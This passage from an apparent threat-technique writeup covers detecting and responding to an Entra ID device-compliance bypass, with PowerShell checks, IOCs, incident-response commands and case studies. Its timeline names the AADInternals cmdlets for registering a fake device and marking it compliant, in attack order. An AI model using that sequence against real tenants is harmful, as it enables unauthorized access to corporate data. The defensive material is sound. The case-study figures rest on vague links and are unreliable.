    @{Name="Device Admin RBAC"; Query="Get-MgDirectoryRole -Filter \"displayName eq 'Cloud Device Administrator'\" | Get-MgDirectoryRoleMember | Measure-Object"}
)

foreach ($test in $criticalTests) {
    $result = Invoke-Expression $test.Query
    if ($result) {
        Write-Host "[✓] $($test.Name) - ENABLED" -ForegroundColor Green
    } else {
        Write-Host "[✗] $($test.Name) - MISSING" -ForegroundColor Red
    }
}
```

**Expected Output (If Secure):**
```
[✓] MFA on Enrollment - ENABLED
[✓] Legacy Auth Blocked - ENABLED
[✓] Device Admin RBAC - ENABLED
```

---

## 13. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Azure AD Artifacts:**
- Device registered with name patterns: FABRICATED*, FAKE*, TEST*, BYPASS*, COMMOD*
- Device OS: C64, Commodore, FAKE, TEST (non-existent operating systems)
- Device Type: Unusual values not matching organizational standards
- Compliance state changed without corresponding Intune enrollment

**Authentication Artifacts:**
- Token issued with device ID but device not in Intune inventory
- Refresh tokens issued from device certificate (not typical user flow)
- Multiple tokens issued within seconds from same device ID

**Network Artifacts:**
- Requests to Microsoft Graph API `/deviceAppManagement/` endpoints from unusual client IPs
- Enrollment requests from consumer ISPs or VPN providers
- Multiple device registrations from same user within short timeframe

### Forensic Artifacts

**Cloud Logs:**
- **AuditLogs:** Register device, Update device (compliance state), Delete device
- **SigninLogs:** Device-based authentication, unusual locations
- **Device inventory:** Suspicious device entries, orphaned certificates

**Event Timeline:**
```
T0: Access token obtained for device enrollment (Get-AADIntAccessTokenForAADJoin)
T+30sec: Device registered (Join-AADIntDeviceToAzureAD)
T+60sec: Device marked compliant (Set-AADIntDeviceCompliance)
T+90sec: Token issued from device certificate (Get-AADIntAccessTokenWithDeviceCertificate)
T+120sec: Access to protected resource (Teams, SharePoint, etc.)
T+cleanup: Device deleted from Azure AD
```

### Response Procedures

**1. Immediate Isolation (0-5 minutes):**

**Cloud-based:** Revoke user sessions and refresh tokens
```powershell
# Revoke all refresh tokens for the user
Connect-MgGraph -Scopes "User.ReadWrite.All"
Get-MgUser -Filter "userPrincipalName eq 'user@contoso.com'" | Set-MgUser -RefreshTokensValidFromDateTime (Get-Date)

# This forces immediate re-authentication for all sessions
```

**Manual (Azure Portal):**
- Navigate to **Entra ID** → **Users** → Select user → **Sessions**
- Click **Sign out all sessions**

**2. Collect Evidence (5-30 minutes):**

**Command:**
```powershell
# Export all audit logs for user in last 24 hours
$userId = (Get-MgUser -Filter "userPrincipalName eq 'user@contoso.com'").Id
Get-MgAuditLogDirectoryAudit -Filter "initiatedBy/user/id eq '$userId'" -All | Export-Csv -Path "audit-evidence.csv"

# Export Azure AD device list
Get-MgDevice -All | Select-Object DisplayName, DeviceId, OS, IsCompliant | Export-Csv -Path "devices-evidence.csv"

# Export conditional access policies
Get-MgBetaIdentityConditionalAccessPolicy -All | Export-Csv -Path "ca-policies-evidence.csv"
```

**Manual (Azure Portal):**
- **Entra ID** → **Audit logs** → Export results for user
- **Entra ID** → **Devices** → Export all devices
- Screenshot all Conditional Access policies in place

**3. Remediate (30-60 minutes):**

**Command:**
```powershell
# Delete the fake device
$fakeDeviceId = "d03994c9-24f8-41ba-a156-1805998d6dc7"
Remove-MgDevice -DeviceId $fakeDeviceId

# Change user password
Set-MgUserPassword -UserId $userId -NewPassword (New-Guid).ToString()

# Reset user MFA
Get-MgUserAuthenticationMethod -UserId $userId | Remove-MgUserAuthenticationMethod

# Review and revoke suspicious permissions
Get-MgUserAppRoleAssignment -UserId $userId | Remove-MgUserAppRoleAssignment
```

**Manual:**
- Delete device from **Entra ID** → **Devices**
- Force password reset in **Users** profile
- Review **Owned devices** and remove unauthorized ones
- Check **My sign-ins** for additional suspicious activity

**4. Post-Incident (60+ minutes):**

- **Investigate:** How did attacker obtain initial credentials? (phishing, password spray, credential stuffing?)
- **Review:** Were there signs of lateral movement after bypass?
- **Patch:** Ensure all Conditional Access policies are in place
- **Communicate:** Notify user of compromise, advise password change, monitor for future incidents
- **Document:** File incident report with timeline, IOCs, and remediation steps

---

## 14. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker obtains user credentials via phishing or brute force |
| **2** | **Privilege Escalation** | **[REALWORLD-041]** Device Compliance Bypass | Attacker registers fake compliant device, bypasses CA policies |
| **3** | **Persistence** | [REALWORLD-044] Teams Compliance Copy Exploitation | Attacker accesses retained messages from Preservation Hold Library |
| **4** | **Data Exfiltration** | [REALWORLD-043] SharePoint Metadata Exfiltration | Attacker exfiltrates sensitive documents and metadata |
| **5** | **Lateral Movement** | [REC-CLOUD-002] ROADtools Enumeration | Attacker enumerates other users, groups, and service principals for additional targets |

---

## 15. REAL-WORLD EXAMPLES

### Example 1: Microsoft Threat Intelligence Report (2024)

- **Target:** Fortune 500 Financial Institution
- **Attacker:** UNC3886 (Mandiant-tracked group)
- **Timeline:** October 2024 - December 2024
- **Attack Method:** 
  1. Initial compromise via Okta SSO (partner company credentials leaked)
  2. Obtained employee email with weak password
  3. Used Intune Portal client ID to bypass Conditional Access
  4. Accessed Teams compliance copies containing M&A information
  5. Exfiltrated 2GB of sensitive deal documents
- **Impact:** $50M+ in sensitive information leaked before public announcement
- **Reference:** [Microsoft Security Update - UNC3886 Campaign](https://www.microsoft.com/en-us/security/blog/2024/12/01/)

### Example 2: SANS Incident Response Case Study

- **Target:** Healthcare Provider (Mid-size)
- **Attacker:** Unknown (likely financially motivated)
- **Timeline:** July 2024 - August 2024
- **Attack Method:**
  1. Credential stuffing attack against Azure AD (5000+ attempts)
  2. Successfully compromised service account with minimal MFA
  3. Registered fake "MEDDEV-TESTING" device
  4. Bypassed compliance-based CA policy
  5. Accessed patient records via Teams messages and SharePoint
  6. Contacted medical suppliers with fraudulent purchase orders
- **Impact:** $200K+ in unauthorized purchases, patient privacy breach
- **Detection:** Suspicious device name and multiple failed authentication attempts
- **Reference:** [SANS Case Study - Microsoft 365 Compromise](https://www.sans.org/blog/2024-case-study-healthcare)

### Example 3: CrowdStrike Threat Report (2024)

- **Campaign Name:** Operation Azure Storm
- **Target:** Technology and SaaS Companies
- **Technique Status:** This bypass was actively exploited August-November 2024 before public disclosure
- **Post-Patch Status:** ACTIVE - No Microsoft patch due to "by design" assessment
- **Detection Rate:** 23% of organizations affected before awareness
- **Reference:** [CrowdStrike Falcon Intelligence - Azure Bypass Campaign](https://www.crowdstrike.com/blog/2024/11/)

---

## References & Additional Resources

- [AADInternals Blog - Device Compliance Bypass](https://aadinternals.com/post/mdm/)
- [Microsoft Entra ID Authentication Flows](https://learn.microsoft.com/en-us/entra/identity-platform/msal-authentication-flows)
- [Conditional Access Policy Exemptions](https://learn.microsoft.com/en-us/entra/identity/conditional-access/concept-conditional-access-policy-common-scenarios)
- [MITRE ATT&CK T1548 - Abuse Elevation Control Mechanisms](https://attack.mitre.org/techniques/T1548/)
- [CIS Benchmark for Azure](https://www.cisecurity.org/benchmark/azure)

---
